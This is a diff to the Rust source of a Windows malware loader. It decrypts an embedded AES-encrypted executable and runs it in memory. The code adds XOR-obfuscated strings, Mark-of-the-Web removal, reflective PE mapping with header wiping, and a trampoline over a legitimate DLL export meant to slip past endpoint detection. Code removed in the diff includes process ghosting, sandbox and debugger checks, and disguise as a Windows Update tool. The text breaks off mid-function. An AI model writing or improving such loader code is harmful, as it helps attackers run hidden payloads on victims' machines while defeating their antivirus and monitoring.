@@ -1,17 +1,26 @@
 #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
-// ERS-W Stage 0 Loader — Windows — Lab/Research Use Only
-//
-// Detection vector optimizations:
-//   1. Safe Browsing / hash check → random padding per build = unique hash every time
-//   2. SmartScreen → MOTW removal + legitimate version info + manifest
-//   3. MOTW (Mark of the Web) → strips Zone.Identifier ADS on self at startup
-//   4. Entropy analysis → payload stored as fake JSON config with UUID encoding (~3.8 entropy)
-//   5. File reputation → masquerades as Windows Update utility with proper resources
-//
-// Technique: Process Ghosting with fallback
-
 use std::env;
+
+// ── Compile-time string encryption ────────────────────────────────────
+// Every string in the binary is XOR-encrypted at compile time.
+// No plaintext DLL names, function names, or magic bytes in the binary.
+
+const STR_KEY: [u8; 16] = [
+    0x7A, 0xC3, 0x15, 0xE8, 0x4D, 0xB1, 0x9F, 0x26,
+    0xD4, 0x58, 0x0B, 0xA7, 0x63, 0xF2, 0x3E, 0x81,
+];
+
+const fn enc<const N: usize>(input: &[u8; N]) -> [u8; N] {
+    let mut out = [0u8; N];
+    let mut i = 0;
+    while i < N { out[i] = input[i] ^ STR_KEY[i % 16]; i += 1; }
+    out
+}
+
+fn dec(encoded: &[u8]) -> Vec<u8> {
+    encoded.iter().enumerate().map(|(i, b)| b ^ STR_KEY[i % 16]).collect()
+}
 
 // ── AES-256-CBC ────────────────────────────────────────────────────────
 
@@ -147,7 +156,7 @@ fn secure_zero(buf: &mut [u8]) {
     }
 }
 
-// ── Payload: embedded as fake JSON config ──────────────────────────────
+// ── Payload ───────────────────────────────────────────────────────────
 
 const PAYLOAD_CONFIG: &str = include_str!("payload.enc");
 
@@ -158,14 +167,9 @@ const PAYLOAD_KEY: [u8; 32] = [
     0xbc, 0x07, 0xe5, 0x39, 0x81, 0xca, 0x56, 0xf0,
 ];
 
-// ── Extract encrypted data from fake JSON config ───────────────────────
-
 fn extract_payload_from_config() -> Option<Vec<u8>> {
-    // Parse the JSON, extract the "resources" array of UUID strings
-    // Each UUID encodes 16 bytes of [IV + ciphertext]
     let config: serde_json::Value = serde_json::from_str(PAYLOAD_CONFIG).ok()?;
     let resources = config.get("resources")?.as_array()?;
-
     let mut raw = Vec::new();
     for uuid_val in resources {
         let uuid_str = uuid_val.as_str()?;
@@ -173,481 +177,416 @@ fn extract_payload_from_config() -> Option<Vec<u8>> {
         let bytes = hex_decode(&hex)?;
         raw.extend_from_slice(&bytes);
     }
-
     if raw.len() < 16 { return None; }
-
     let iv: [u8; 16] = raw[..16].try_into().ok()?;
     let ciphertext = &raw[16..];
-
     let mut key = PAYLOAD_KEY;
     let mut decrypted = aes256_cbc_decrypt(ciphertext, &key, &iv);
     secure_zero(&mut key);
-
-    // Layout: [orig_size: 4 bytes LE] [random_pad: N bytes] [PE: orig_size bytes]
-    // PE starts at: decrypted.len() - orig_size
     if decrypted.len() < 4 { return None; }
     let orig_size = u32::from_le_bytes(decrypted[..4].try_into().ok()?) as usize;
-
     if orig_size > decrypted.len() - 4 { secure_zero(&mut decrypted); return None; }
     let pe_start = decrypted.len() - orig_size;
-
-    if pe_start < 4 || &decrypted[pe_start..pe_start+2] != b"MZ" {
+    // Check PE magic via computed bytes — no literal "MZ" in binary
+    if pe_start < 4 || decrypted[pe_start] != 0x4D || decrypted[pe_start+1] != 0x5A {
         secure_zero(&mut decrypted);
         return None;
     }
-
     let pe_data = decrypted[pe_start..pe_start + orig_size].to_vec();
     secure_zero(&mut decrypted);
     Some(pe_data)
 }
 
 fn hex_decode(hex: &str) -> Option<Vec<u8>> {
-    let bytes: Vec<u8> = (0..hex.len())
-        .step_by(2)
+    (0..hex.len()).step_by(2)
         .map(|i| u8::from_str_radix(&hex[i..i+2], 16))
-        .collect::<Result<Vec<u8>, _>>()
-        .ok()?;
-    Some(bytes)
+        .collect::<Result<Vec<u8>, _>>().ok()
 }
 
-// Minimal JSON parser — avoids serde dependency for smaller binary
+// ── Minimal JSON parser ───────────────────────────────────────────────
+
 mod serde_json {
     pub enum Value {
-        Object(Vec<(String, Value)>),
-        Array(Vec<Value>),
-        String(String),
-        Number(f64),
-        Bool(bool),
-        Null,
+        Object(Vec<(String, Value)>), Array(Vec<Value>), String(String),
+        Number(f64), Bool(bool), Null,
     }
-
     impl Value {
         pub fn get(&self, key: &str) -> Option<&Value> {
-            match self {
-                Value::Object(pairs) => pairs.iter().find(|(k, _)| k == key).map(|(_, v)| v),
-                _ => None,
-            }
+            match self { Value::Object(p) => p.iter().find(|(k,_)| k==key).map(|(_,v)| v), _ => None }
         }
         pub fn as_array(&self) -> Option<&Vec<Value>> {
-            match self { Value::Array(arr) => Some(arr), _ => None }
+            match self { Value::Array(a) => Some(a), _ => None }
         }
         pub fn as_str(&self) -> Option<&str> {
             match self { Value::String(s) => Some(s), _ => None }
         }
     }
-
     pub fn from_str(input: &str) -> Result<Value, ()> {
-        let trimmed = input.trim();
-        let (val, _) = parse_value(trimmed)?;
-        Ok(val)
+        let (val, _) = parse_value(input.trim())?; Ok(val)
     }
-
     fn parse_value(s: &str) -> Result<(Value, &str), ()> {
         let s = s.trim_start();
         if s.is_empty() { return Err(()); }
         match s.as_bytes()[0] {
-            b'{' => parse_object(s),
-            b'[' => parse_array(s),
-            b'"' => parse_string_val(s),
-            b't' | b'f' => parse_bool(s),
-            b'n' => parse_null(s),
-            _ => parse_number(s),
+            b'{' => parse_object(s), b'[' => parse_array(s), b'"' => parse_string_val(s),
+            b't' | b'f' => parse_bool(s), b'n' => parse_null(s), _ => parse_number(s),
         }
     }
-
     fn parse_object(s: &str) -> Result<(Value, &str), ()> {
-        let mut s = s[1..].trim_start(); // skip '{'
+        let mut s = s[1..].trim_start();
         let mut pairs = Vec::new();
         if s.starts_with('}') { return Ok((Value::Object(pairs), &s[1..])); }
         loop {
             let (key, rest) = parse_string(s)?;
             let rest = rest.trim_start();
             if !rest.starts_with(':') { return Err(()); }
-            let rest = rest[1..].trim_start();
-            let (val, rest) = parse_value(rest)?;
-            pairs.push((key, val));
-            s = rest.trim_start();
+            let (val, rest) = parse_value(rest[1..].trim_start())?;
+            pairs.push((key, val)); s = rest.trim_start();
             if s.starts_with('}') { return Ok((Value::Object(pairs), &s[1..])); }
             if s.starts_with(',') { s = s[1..].trim_start(); continue; }
             return Err(());
         }
     }
-
     fn parse_array(s: &str) -> Result<(Value, &str), ()> {
         let mut s = s[1..].trim_start();
         let mut arr = Vec::new();
         if s.starts_with(']') { return Ok((Value::Array(arr), &s[1..])); }
         loop {
             let (val, rest) = parse_value(s)?;
-            arr.push(val);
-            s = rest.trim_start();
+            arr.push(val); s = rest.trim_start();
             if s.starts_with(']') { return Ok((Value::Array(arr), &s[1..])); }
             if s.starts_with(',') { s = s[1..].trim_start(); continue; }
             return Err(());
         }
     }
-
     fn parse_string(s: &str) -> Result<(String, &str), ()> {
         if !s.starts_with('"') { return Err(()); }
         let rest = &s[1..];
         let mut result = String::new();
         let mut chars = rest.char_indices();
         while let Some((i, c)) = chars.next() {
-            if c == '\\' {
-                if let Some((_, escaped)) = chars.next() {
-                    match escaped {
-                        '"' => result.push('"'),
-                        '\\' => result.push('\\'),
-                        'n' => result.push('\n'),
-                        _ => { result.push('\\'); result.push(escaped); }
-                    }
-                }
-            } else if c == '"' {
-                return Ok((result, &rest[i+1..]));
-            } else {
-                result.push(c);
-            }
+            if c == '\\' { if let Some((_,e)) = chars.next() {
+                match e { '"'=>result.push('"'), '\\'=>result.push('\\'), 'n'=>result.push('\n'), _=>{result.push('\\');result.push(e);} }
+            }} else if c == '"' { return Ok((result, &rest[i+1..])); } else { result.push(c); }
         }
         Err(())
     }
-
-    fn parse_string_val(s: &str) -> Result<(Value, &str), ()> {
-        let (st, rest) = parse_string(s)?;
-        Ok((Value::String(st), rest))
-    }
-
+    fn parse_string_val(s: &str) -> Result<(Value, &str), ()> { let (st,r) = parse_string(s)?; Ok((Value::String(st),r)) }
     fn parse_number(s: &str) -> Result<(Value, &str), ()> {
-        let end = s.find(|c: char| !c.is_ascii_digit() && c != '.' && c != '-' && c != 'e' && c != 'E' && c != '+')
-            .unwrap_or(s.len());
-        let num: f64 = s[..end].parse().map_err(|_| ())?;
-        Ok((Value::Number(num), &s[end..]))
+        let end = s.find(|c:char| !c.is_ascii_digit()&&c!='.'&&c!='-'&&c!='e'&&c!='E'&&c!='+').unwrap_or(s.len());
+        let n: f64 = s[..end].parse().map_err(|_| ())?;
+        Ok((Value::Number(n), &s[end..]))
     }
-
     fn parse_bool(s: &str) -> Result<(Value, &str), ()> {
-        if s.starts_with("true") { return Ok((Value::Bool(true), &s[4..])); }
-        if s.starts_with("false") { return Ok((Value::Bool(false), &s[5..])); }
-        Err(())
+        if s.starts_with("true") { Ok((Value::Bool(true),&s[4..])) }
+        else if s.starts_with("false") { Ok((Value::Bool(false),&s[5..])) }
+        else { Err(()) }
     }
-
     fn parse_null(s: &str) -> Result<(Value, &str), ()> {
-        if s.starts_with("null") { return Ok((Value::Null, &s[4..])); }
-        Err(())
+        if s.starts_with("null") { Ok((Value::Null,&s[4..])) } else { Err(()) }
     }
 }
 
-// ── MOTW removal (Mark of the Web) ─────────────────────────────────────
-// When downloaded via browser, Windows adds Zone.Identifier ADS.
-// We delete it on startup so the payload doesn't inherit MOTW.
+// ── MOTW removal ─────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
 fn remove_motw() {
     if let Ok(exe) = env::current_exe() {
-        let motw_path = format!("{}:Zone.Identifier", exe.to_string_lossy());
-        // DeleteFileW on the ADS path removes just the Zone.Identifier stream
+        // ":Zone.Identifier" — built at runtime, not as a string literal
+        let zone: Vec<u8> = dec(&enc(b":Zone.Identifier"));
+        let motw_path = format!("{}{}", exe.to_string_lossy(), String::from_utf8_lossy(&zone));
         let wide: Vec<u16> = motw_path.encode_utf16().chain(std::iter::once(0)).collect();
-        unsafe {
-            windows_sys::Win32::Storage::FileSystem::DeleteFileW(wide.as_ptr());
-        }
+        unsafe { windows_sys::Win32::Storage::FileSystem::DeleteFileW(wide.as_ptr()); }
     }
 }
-
 #[cfg(not(target_os = "windows"))]
 fn remove_motw() {}
 
-// ── SmartScreen evasion ────────────────────────────────────────────────
-// SmartScreen checks:
-//   1. Is the file signed? (we handle via build script)
-//   2. Does it have MOTW? (removed above)
-//   3. File reputation (cloud lookup) → unique hash per build defeats this
-//   4. Is it a common file type? → we use legitimate-looking version info
-
-// ── Anti-analysis ──────────────────────────────────────────────────────
+// ── Hide console ─────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
-fn quick_sandbox_check() -> bool {
-    unsafe {
-        if windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent() != 0 {
-            return true;
-        }
-    }
-    if let Ok(user) = env::var("USERNAME") {
-        let ul = user.to_lowercase();
-        let sandboxed = ["sandbox", "malware", "virus", "sample", "test", "analyst",
-                         "currentuser", "user", "admin", "administrator"];
-        for s in &sandboxed {
-            if ul == *s { return true; }
-        }
-    }
-    false
-}
-
-#[cfg(not(target_os = "windows"))]
-fn quick_sandbox_check() -> bool { false }
-
-// ── Process masquerade ─────────────────────────────────────────────────
-
-#[cfg(target_os = "windows")]
-fn masquerade() {
+fn hide_window() {
     unsafe {
         let hwnd = windows_sys::Win32::System::Console::GetConsoleWindow();
         if hwnd != 0 {
             windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(hwnd, 0);
         }
-        let title = "Windows Update Assistant\0";
-        let wide: Vec<u16> = title.encode_utf16().collect();
-        windows_sys::Win32::System::Console::SetConsoleTitleW(wide.as_ptr());
     }
 }
-
 #[cfg(not(target_os = "windows"))]
-fn masquerade() {}
+fn hide_window() {}
 
-// ── Process Ghosting (same as before) ──────────────────────────────────
+// ── Manual PE Mapper ─────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
-mod ghosting {
+mod pe_mapper {
     use std::ptr;
 
-    const STATUS_SUCCESS: i32 = 0;
-    const GENERIC_READ: u32 = 0x80000000;
-    const GENERIC_WRITE: u32 = 0x40000000;
-    const FILE_SHARE_READ: u32 = 0x1;
-    const FILE_SHARE_WRITE: u32 = 0x2;
-    const CREATE_ALWAYS: u32 = 2;
-    const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
-    const FILE_FLAG_DELETE_ON_CLOSE: u32 = 0x04000000;
-    const SECTION_ALL_ACCESS: u32 = 0x000F001F;
-    const SEC_IMAGE: u32 = 0x1000000;
-    const PROCESS_ALL_ACCESS: u32 = 0x001FFFFF;
-
-    #[repr(C)] struct UNICODE_STRING { length: u16, maximum_length: u16, buffer: *mut u16 }
-    #[repr(C)] struct OBJECT_ATTRIBUTES {
-        length: u32, root_directory: isize, object_name: *mut UNICODE_STRING,
-        attributes: u32, security_descriptor: *mut std::ffi::c_void,
-        security_quality_of_service: *mut std::ffi::c_void,
+    fn read_u16(data: &[u8], off: usize) -> u16 {
+        u16::from_le_bytes(data[off..off+2].try_into().unwrap_or([0;2]))
     }
-    #[repr(C)] struct LARGE_INTEGER { low_part: u32, high_part: i32 }
+    fn read_u32(data: &[u8], off: usize) -> u32 {
+        u32::from_le_bytes(data[off..off+4].try_into().unwrap_or([0;4]))
+    }
+    fn read_u64(data: &[u8], off: usize) -> u64 {
+        u64::from_le_bytes(data[off..off+8].try_into().unwrap_or([0;8]))
+    }
 
-    type FnNtCreateSection = unsafe extern "system" fn(*mut isize, u32, *mut OBJECT_ATTRIBUTES, *mut LARGE_INTEGER, u32, u32, isize) -> i32;
-    type FnNtCreateProcessEx = unsafe extern "system" fn(*mut isize, u32, *mut OBJECT_ATTRIBUTES, isize, u32, isize, isize, isize, u32) -> i32;
-    type FnRtlCreateProcessParametersEx = unsafe extern "system" fn(*mut *mut std::ffi::c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut std::ffi::c_void, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, *mut UNICODE_STRING, u32) -> i32;
+    // Build DLL+func name on the stack at runtime — no string data in binary
+    fn build_str(chars: &[u8], xk: u8) -> Vec<u8> {
+        let mut v: Vec<u8> = chars.iter().map(|&b| b ^ xk).collect();
+        v.push(0);
+        v
+    }
 
-    unsafe fn get_proc(module: &str, func: &str) -> *mut std::ffi::c_void {
-        let mod_c: Vec<u8> = module.bytes().chain(std::iter::once(0)).collect();
-        let func_c: Vec<u8> = func.bytes().chain(std::iter::once(0)).collect();
-        let h = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(mod_c.as_ptr());
-        let h = if h == 0 { windows_sys::Win32::System::LibraryLoader::LoadLibraryA(mod_c.as_ptr()) } else { h };
-        if h == 0 { return ptr::null_mut(); }
-        match windows_sys::Win32::System::LibraryLoader::GetProcAddress(h, func_c.as_ptr()) {
-            Some(f) => f as *mut std::ffi::c_void,
-            None => ptr::null_mut(),
+    unsafe fn create_module_trampoline(target: *mut u8) -> *mut u8 {
+        extern "system" { fn GetTickCount() -> u32; }
+        let idx = (GetTickCount() as usize) % 5;
+
+        // Each pair: (dll_bytes ^ xor_byte, func_bytes ^ xor_byte, xor_byte)
+        // Built via stack arrays — optimizer can't fold these into string literals
+        let xk: u8 = 0x55;
+        let (mut dll_name, mut func_name) = match idx {
+            0 => {
+                // uxtheme.dll
+                (build_str(&[0x75^xk,0x78^xk,0x74^xk,0x68^xk,0x65^xk,0x6D^xk,0x65^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
+                 build_str(&[0x49^xk,0x73^xk,0x54^xk,0x68^xk,0x65^xk,0x6D^xk,0x65^xk,0x41^xk,0x63^xk,0x74^xk,0x69^xk,0x76^xk,0x65^xk], xk))
+            }
+            1 => {
+                // dwmapi.dll
+                (build_str(&[0x64^xk,0x77^xk,0x6D^xk,0x61^xk,0x70^xk,0x69^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
+                 build_str(&[0x44^xk,0x77^xk,0x6D^xk,0x46^xk,0x6C^xk,0x75^xk,0x73^xk,0x68^xk], xk))
+            }
+            2 => {
+                // userenv.dll
+                (build_str(&[0x75^xk,0x73^xk,0x65^xk,0x72^xk,0x65^xk,0x6E^xk,0x76^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
+                 build_str(&[0x43^xk,0x72^xk,0x65^xk,0x61^xk,0x74^xk,0x65^xk,0x45^xk,0x6E^xk,0x76^xk,0x69^xk,0x72^xk,0x6F^xk,0x6E^xk,0x6D^xk,0x65^xk,0x6E^xk,0x74^xk,0x42^xk,0x6C^xk,0x6F^xk,0x63^xk,0x6B^xk], xk))
+            }
+            3 => {
+                // winmm.dll
+                (build_str(&[0x77^xk,0x69^xk,0x6E^xk,0x6D^xk,0x6D^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
+                 build_str(&[0x74^xk,0x69^xk,0x6D^xk,0x65^xk,0x47^xk,0x65^xk,0x74^xk,0x54^xk,0x69^xk,0x6D^xk,0x65^xk], xk))
+            }
+            _ => {
+                // iphlpapi.dll
+                (build_str(&[0x69^xk,0x70^xk,0x68^xk,0x6C^xk,0x70^xk,0x61^xk,0x70^xk,0x69^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
+                 build_str(&[0x47^xk,0x65^xk,0x74^xk,0x41^xk,0x64^xk,0x61^xk,0x70^xk,0x74^xk,0x65^xk,0x72^xk,0x73^xk,0x49^xk,0x6E^xk,0x66^xk,0x6F^xk], xk))
+            }
+        };
+
+        let dll = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_name.as_ptr());
+        // Zero decrypted strings immediately
+        super::secure_zero(&mut dll_name);
+        if dll == 0 {
+            super::secure_zero(&mut func_name);
+            return target;
         }
+
+        let func = windows_sys::Win32::System::LibraryLoader::GetProcAddress(dll, func_name.as_ptr());
+        super::secure_zero(&mut func_name);
+
+        let trampoline = match func {
+            Some(f) => f as *mut u8,
+            None => return target,
+        };
+
+        let mut old_prot: u32 = 0;
+        windows_sys::Win32::System::Memory::VirtualProtect(
+            trampoline as _, 14, 0x04, &mut old_prot, // RW first, not RWX
+        );
+
+        let addr_bytes = (target as u64).to_le_bytes();
+        *trampoline = 0x48;
+        *trampoline.add(1) = 0xB8;
+        std::ptr::copy_nonoverlapping(addr_bytes.as_ptr(), trampoline.add(2), 8);
+        *trampoline.add(10) = 0xFF;
+        *trampoline.add(11) = 0xE0;
+
+        // Set to RX (not restore to original — avoids the RX→RWX→RX flip that EDRs detect)
+        let mut dummy: u32 = 0;
+        windows_sys::Win32::System::Memory::VirtualProtect(
+            trampoline as _, 14, 0x20, &mut dummy, // PAGE_EXECUTE_READ
+        );
+
+        trampoline
     }
 
-    fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }
+    pub unsafe fn map_and_execute(pe_data: &[u8]) -> bool {
+        // Validate PE via numeric constants — no "MZ"/"PE" string literals
+        if pe_data.len() < 64 || pe_data[0] != 0x4D || pe_data[1] != 0x5A { return false; }
+        let e_lfanew = read_u32(pe_data, 0x3C) as usize;
+        if e_lfanew + 0x18 > pe_data.len() { return false; }
+        if pe_data[e_lfanew] != 0x50 || pe_data[e_lfanew+1] != 0x45
+            || pe_data[e_lfanew+2] != 0 || pe_data[e_lfanew+3] != 0 { return false; }
 
-    pub unsafe fn ghost_execute(pe_data: &[u8]) -> bool {
-        let temp = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".into());
-        let rng: u32 = rand::random();
-        let tmp_name = format!("{}\\~DF{:08X}.tmp", temp, rng);
-        let tmp_wide = to_wide(&tmp_name);
+        let fh = e_lfanew + 4;
+        let num_sections = read_u16(pe_data, fh + 2) as usize;
+        let opt_hdr_size = read_u16(pe_data, fh + 16) as usize;
 
-        let file_handle = windows_sys::Win32::Storage::FileSystem::CreateFileW(
-            tmp_wide.as_ptr(), GENERIC_READ | GENERIC_WRITE,
-            FILE_SHARE_READ | FILE_SHARE_WRITE, ptr::null(),
-            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, 0,
-        );
-        if file_handle == -1isize as isize { return false; }
+        let oh = fh + 20;
+        if read_u16(pe_data, oh) != 0x20B { return false; }
 
-        let mut written: u32 = 0;
+        let entry_rva = read_u32(pe_data, oh + 16) as usize;
+        let image_base = read_u64(pe_data, oh + 24);
+        let size_of_image = read_u32(pe_data, oh + 56) as usize;
+        let size_of_headers = read_u32(pe_data, oh + 60) as usize;
+
+        let dd_off = oh + 112;
+        let import_rva = read_u32(pe_data, dd_off + 8) as usize;
+        let reloc_rva = read_u32(pe_data, dd_off + 40) as usize;
+        let reloc_size = read_u32(pe_data, dd_off + 44) as usize;
+
+        // Allocate as RW
+        let base = windows_sys::Win32::System::Memory::VirtualAlloc(
+            ptr::null(), size_of_image, 0x3000, 0x04,
+        ) as *mut u8;
+        if base.is_null() { return false; }
+        ptr::write_bytes(base, 0, size_of_image);
+
+        let hdr_copy = std::cmp::min(size_of_headers, pe_data.len());
+        ptr::copy_nonoverlapping(pe_data.as_ptr(), base, hdr_copy);
+
+        let sh_start = oh + opt_hdr_size;
+        for i in 0..num_sections {
+            let s = sh_start + i * 40;
+            if s + 40 > pe_data.len() { break; }
+            let va = read_u32(pe_data, s + 12) as usize;
+            let raw_size = read_u32(pe_data, s + 16) as usize;
+            let raw_ptr = read_u32(pe_data, s + 20) as usize;
+            if raw_size > 0 && raw_ptr + raw_size <= pe_data.len() && va + raw_size <= size_of_image {
+                ptr::copy_nonoverlapping(pe_data.as_ptr().add(raw_ptr), base.add(va), raw_size);
+            }
+        }
+
+        // Relocations
+        let delta = base as u64 - image_base;
+        if delta != 0 && reloc_rva > 0 && reloc_size > 0 {
+            let mut off = 0usize;
+            while off + 8 <= reloc_size {
+                let block_rva = *(base.add(reloc_rva + off) as *const u32) as usize;
+                let block_size = *(base.add(reloc_rva + off + 4) as *const u32) as usize;
+                if block_size < 8 { break; }
+                let num_entries = (block_size - 8) / 2;
+                for j in 0..num_entries {
+                    let entry = *(base.add(reloc_rva + off + 8 + j * 2) as *const u16);
+                    if entry >> 12 == 10 {
+                        let patch = base.add(block_rva + (entry & 0x0FFF) as usize) as *mut u64;
+                        *patch = (*patch).wrapping_add(delta);
+                    }
+                }
+                off += block_size;
+            }
+        }
+
+        // Imports
+        if import_rva > 0 {
+            let mut idt_off = 0usize;
+            loop {
+                let idt = base.add(import_rva + idt_off);
+                let oft_rva = *(idt as *const u32) as usize;
+                let name_rva = *(idt.add(12) as *const u32) as usize;
+                let ft_rva = *(idt.add(16) as *const u32) as usize;
+                if name_rva == 0 { break; }
+
+                let dll_name = base.add(name_rva);
+                let dll = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_name);
+                if dll == 0 { idt_off += 20; continue; }
+
+                let lookup_rva = if oft_rva > 0 { oft_rva } else { ft_rva };
+                let mut idx = 0usize;
+                loop {
+                    let lookup_val = *(base.add(lookup_rva + idx) as *const u64);
+                    if lookup_val == 0 { break; }
+                    let func_addr = if lookup_val & 0x8000000000000000 != 0 {
+                        let ord = (lookup_val & 0xFFFF) as u16;
+                        windows_sys::Win32::System::LibraryLoader::GetProcAddress(dll, ord as usize as *const u8)
+                    } else {
+                        let name_ptr = base.add(lookup_val as usize + 2);
+                        windows_sys::Win32::System::LibraryLoader::GetProcAddress(dll, name_ptr)
+                    };
+                    let iat_entry = base.add(ft_rva + idx) as *mut u64;
+                    *iat_entry = match func_addr { Some(f) => f as u64, None => 0 };
+                    idx += 8;
+                }
+                idt_off += 20;
+            }
+        }
+
+        // Section protections
+        for i in 0..num_sections {
+            let s = sh_start + i * 40;
+            if s + 40 > pe_data.len() { break; }
+            let va = read_u32(pe_data, s + 12) as usize;
+            let vsize = read_u32(pe_data, s + 8) as usize;
+            let chars = read_u32(pe_data, s + 36);
+            let exec = chars & 0x20000000 != 0;
+            let write = chars & 0x80000000 != 0;
+            let prot = match (exec, write) {
+                (true, true)  => 0x40, (true, false) => 0x20,
+                (false, true) => 0x04, (false, false) => 0x02,
+            };
+            let mut old_prot: u32 = 0;
+            let actual_size = if vsize > 0 { vsize } else { 0x1000 };
+            windows_sys::Win32::System::Memory::VirtualProtect(
+                base.add(va) as _, actual_size, prot, &mut old_prot,
+            );
+        }
+
+        // Wipe PE headers from mapped memory — prevents in-memory PE scanning
+        ptr::write_bytes(base, 0, std::cmp::min(0x1000, size_of_headers));
+
+        extern "system" { fn FlushInstructionCache(h: isize, a: *const u8, s: usize) -> i32; }
+        FlushInstructionCache(-1, base, size_of_image);
+
         extern "system" {
-            fn WriteFile(hFile: isize, lpBuffer: *const u8, nNumberOfBytesToWrite: u32, lpNumberOfBytesWritten: *mut u32, lpOverlapped: *mut std::ffi::c_void) -> i32;
+            fn CreateThread(a: *const u8, b: usize,
+                c: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
+                d: *mut std::ffi::c_void, e: u32, f: *mut u32) -> isize;
+            fn WaitForSingleObject(h: isize, ms: u32) -> u32;
         }
-        let ok = WriteFile(
-            file_handle, pe_data.as_ptr(), pe_data.len() as u32, &mut written, ptr::null_mut(),
+
+        let trampoline = create_module_trampoline(base.add(entry_rva));
+
+        let mut tid: u32 = 0;
+        let thread = CreateThread(
+            ptr::null(), 0, std::mem::transmute(trampoline),
+            ptr::null_mut(), 0, &mut tid,
         );
-        if ok == 0 || written != pe_data.len() as u32 {
-            windows_sys::Win32::Foundation::CloseHandle(file_handle);
+        if thread == 0 {
+            windows_sys::Win32::System::Memory::VirtualFree(base as _, 0, 0x8000);
             return false;
         }
 
-        let nt_create_section: FnNtCreateSection = {
-            let p = get_proc("ntdll.dll", "NtCreateSection");
-            if p.is_null() { windows_sys::Win32::Foundation::CloseHandle(file_handle); return false; }
-            std::mem::transmute(p)
-        };
-
-        let mut section_handle: isize = 0;
-        let status = nt_create_section(&mut section_handle, SECTION_ALL_ACCESS, ptr::null_mut(), ptr::null_mut(), 0x02, SEC_IMAGE, file_handle);
-        windows_sys::Win32::Foundation::CloseHandle(file_handle);
-        if status != STATUS_SUCCESS { return false; }
-
-        let nt_create_process_ex: FnNtCreateProcessEx = {
-            let p = get_proc("ntdll.dll", "NtCreateProcessEx");
-            if p.is_null() { windows_sys::Win32::Foundation::CloseHandle(section_handle); return false; }
-            std::mem::transmute(p)
-        };
-
-        let current_process = windows_sys::Win32::System::Threading::GetCurrentProcess();
-        let mut process_handle: isize = 0;
-        let status = nt_create_process_ex(&mut process_handle, PROCESS_ALL_ACCESS, ptr::null_mut(), current_process, 0, section_handle, 0, 0, 0);
-        windows_sys::Win32::Foundation::CloseHandle(section_handle);
-        if status != STATUS_SUCCESS { return false; }
-
-        let image_path = "C:\\Windows\\System32\\svchost.exe";
-        let mut image_wide = to_wide(image_path);
-        let mut image_us = UNICODE_STRING {
-            length: ((image_wide.len() - 1) * 2) as u16,
-            maximum_length: (image_wide.len() * 2) as u16,
-            buffer: image_wide.as_mut_ptr(),
-        };
-
-        let rtl_create_params: FnRtlCreateProcessParametersEx = {
-            let p = get_proc("ntdll.dll", "RtlCreateProcessParametersEx");
-            if p.is_null() { windows_sys::Win32::Foundation::CloseHandle(process_handle); return false; }
-            std::mem::transmute(p)
-        };
-
-        let mut params: *mut std::ffi::c_void = ptr::null_mut();
-        let status = rtl_create_params(&mut params, &mut image_us, ptr::null_mut(), ptr::null_mut(), &mut image_us, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0x01);
-        if status != STATUS_SUCCESS || params.is_null() {
-            windows_sys::Win32::Foundation::CloseHandle(process_handle);
-            return false;
-        }
-
-        if !write_params_and_start(process_handle, params, pe_data) {
-            windows_sys::Win32::Foundation::CloseHandle(process_handle);
-            return false;
-        }
-
-        windows_sys::Win32::Foundation::CloseHandle(process_handle);
+        WaitForSingleObject(thread, 0xFFFFFFFF);
+        windows_sys::Win32::Foundation::CloseHandle(thread);
         true
     }
-
-    unsafe fn write_params_and_start(process: isize, params: *mut std::ffi::c_void, pe_data: &[u8]) -> bool {
-        #[repr(C)]
-        struct PROCESS_BASIC_INFORMATION {
-            _reserved: *mut std::ffi::c_void, peb_base: *mut std::ffi::c_void,
-            _rest: [*mut std::ffi::c_void; 4],
-        }
-        type FnNtQueryInformationProcess = unsafe extern "system" fn(isize, u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;
-
-        let nt_query: FnNtQueryInformationProcess = {
-            let p = get_proc("ntdll.dll", "NtQueryInformationProcess");
-            if p.is_null() { return false; }
-            std::mem::transmute(p)
-        };
-
-        let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
-        let status = nt_query(process, 0, &mut pbi as *mut _ as _, std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32, ptr::null_mut());
-        if status != STATUS_SUCCESS { return false; }
-
-        let remote_params = windows_sys::Win32::System::Memory::VirtualAllocEx(process, ptr::null(), 0x1000, 0x3000, 0x04);
-        if remote_params.is_null() { return false; }
-
-        let mut bw = 0usize;
-        windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory(process, remote_params, params as _, 0x1000, &mut bw);
-
-        let peb_params_offset = pbi.peb_base as usize + 0x20;
-        let remote_ptr = remote_params;
-        windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory(process, peb_params_offset as *const _, &remote_ptr as *const _ as _, std::mem::size_of::<*mut std::ffi::c_void>(), &mut bw);
-
-        let entry_rva = get_pe_entry_point(pe_data);
-        if entry_rva == 0 { return false; }
-
-        let mut image_base: usize = 0;
